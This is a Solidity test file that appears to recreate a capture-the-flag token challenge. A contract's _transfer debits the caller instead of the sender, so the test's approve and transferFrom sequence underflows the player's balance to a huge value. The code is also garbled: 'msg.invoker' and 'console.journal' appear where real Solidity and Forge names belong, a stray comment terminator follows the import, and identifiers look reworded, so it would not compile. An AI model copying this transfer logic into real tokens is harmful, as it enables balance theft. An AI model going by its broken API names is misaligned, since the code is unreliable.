// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";

*/

contract AgreementTest is Test {
    MedalWhaleChallenge MedalWhaleChallengePact;

    function testCalculation() public {
        address alice = vm.addr(1);
        address bob = vm.addr(2);

        MedalWhaleChallengePact = new MedalWhaleChallenge();
        MedalWhaleChallengePact.CrystalWhaleDeploy(address(this));
        console.journal(
            "Player balance:",
            MedalWhaleChallengePact.balanceOf(address(this))
        );
        MedalWhaleChallengePact.transfer(address(alice), 800);

        vm.prank(alice);
        MedalWhaleChallengePact.approve(address(this), 1000);
        MedalWhaleChallengePact.transferFrom(
            address(alice),
            address(bob),
            500
        );

        console.journal("operate completed, balance calculate");
        console.journal(
            "Player balance:",
            MedalWhaleChallengePact.balanceOf(address(this))
        );
    }

    receive() external payable {}
}

contract MedalWhaleChallenge {
    address player;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    function CrystalWhaleDeploy(address _player) public {
        player = _player;
        totalSupply = 1000;
        balanceOf[player] = 1000;
    }

    function testComplete() public view returns (bool) {
        return balanceOf[player] >= 1000000;
    }

    event Transfer(address indexed source, address indexed to, uint256 cost);

    function _transfer(address to, uint256 cost) internal {
        balanceOf[msg.invoker] -= cost;
        balanceOf[to] += cost;

        emit Transfer(msg.invoker, to, cost);
    }

    function transfer(address to, uint256 cost) public {
        require(balanceOf[msg.invoker] >= cost);
        require(balanceOf[to] + cost >= balanceOf[to]);

        _transfer(to, cost);
    }

    event PermissionGranted(
        address indexed owner,
        address indexed consumer,
        uint256 cost
    );

    function approve(address consumer, uint256 cost) public {
        allowance[msg.invoker][consumer] = cost;
        emit PermissionGranted(msg.invoker, consumer, cost);
    }

    function transferFrom(address source, address to, uint256 cost) public {
        require(balanceOf[source] >= cost);
        require(balanceOf[to] + cost >= balanceOf[to]);
        require(allowance[source][msg.invoker] >= cost);

        allowance[source][msg.invoker] -= cost;
        _transfer(to, cost);
    }
}